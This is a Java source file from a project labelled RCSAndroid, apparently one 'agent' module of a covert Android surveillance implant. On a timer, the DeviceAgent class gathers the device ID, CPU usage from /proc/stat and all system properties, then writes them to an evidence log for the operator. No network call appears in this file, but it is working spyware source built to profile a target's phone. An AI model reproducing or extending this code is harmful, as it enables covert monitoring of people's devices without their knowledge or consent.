/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI.agent;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.ByteOrder;
import java.util.Iterator;
import java.util.Map;
import java.util.Properties;
import java.util.Map.Entry;

import com.ht.RCSAndroidGUI.Device;
import com.ht.RCSAndroidGUI.LogR;
import com.ht.RCSAndroidGUI.RCSAndroidGUI;
import com.ht.RCSAndroidGUI.event.Event;
import com.ht.RCSAndroidGUI.event.EventBase;
import com.ht.RCSAndroidGUI.utils.Utils;
import com.ht.RCSAndroidGUI.utils.WChar;

import android.provider.Settings;
import android.util.Log;

/**
 * http://android.git.kernel.org/?p=platform/packages/apps/Settings.git;a=tree;f=src/com/android/settings;h=1d1b538ef4728c9559da43828a7df9e9bb5c512f;hb=HEAD
 * 
 * @author zeno
 *
 */
public class DeviceAgent extends AgentBase {
	private int processList;
	private float cpuUsage;
	private long cpuTotal;
	private long cpuIdle;

	public DeviceAgent() {
		Log.d("RCS", "DeviceAgent constructor");
	}
	
	public void parse(byte[] conf) {
		myConf = Utils.BufferToByteBuffer(conf, ByteOrder.LITTLE_ENDIAN);
		
		this.processList = myConf.getInt();
	}
	
	public void begin() {
		setPeriod(2000);
	}
	
	public void go() {
		LogR log = new LogR(Agent.AGENT_DEVICE, LogR.LOG_PRI_STD);
		
		// OS Version etc...
		Log.d("RCS", "Android");
		
		Runtime runtime =  Runtime.getRuntime();
		Properties properties = System.getProperties();
		readCpuUsage();
		
		final StringBuffer sb = new StringBuffer();

        //#ifdef DEBUG
        sb.append("Debug\n");
        //#endif
 

        sb.append("-- SYSTEM --\r\n");
        sb.append("Id: " + Device.self().getDeviceId() + "\n");
        sb.append("cpuUsage: " + cpuUsage + "\n");
        sb.append("cpuTotal: " + cpuTotal + "\n");
        sb.append("cpuIdle: " + cpuIdle + "\n");
		
        sb.append("-- PROPERTIES --\r\n");
        Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();
		while (it.hasNext()) {
			Entry<Object, Object> pairs = it.next();
			sb.append(pairs.getKey() + " : "+ pairs.getValue()+"\n");
		}
        
		if (processList == 1) {
			
		}
		
		String content = sb.toString();
		log.write(WChar.getBytes(content, true));
		
		log.close();
	}
	

	private void readCpuUsage( )
	{
	    try
	    {
	        BufferedReader reader = new BufferedReader( new InputStreamReader( new FileInputStream( "/proc/stat" ) ), 1000 );
	        String load = reader.readLine();
	        reader.close();     

	        String[] toks = load.split(" ");

	        long currTotal = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[4]);
	        long currIdle = Long.parseLong(toks[5]);

	        this.cpuUsage = ((currTotal - cpuTotal) * 100.0f / (currTotal - cpuTotal + currIdle - cpuIdle));
	        this.cpuTotal = currTotal;
	        this.cpuIdle = currIdle;
	    }
	    catch( IOException ex )
	    {
	        ex.printStackTrace();           
	    }
	}
	
	public void end() {
		
	}
}
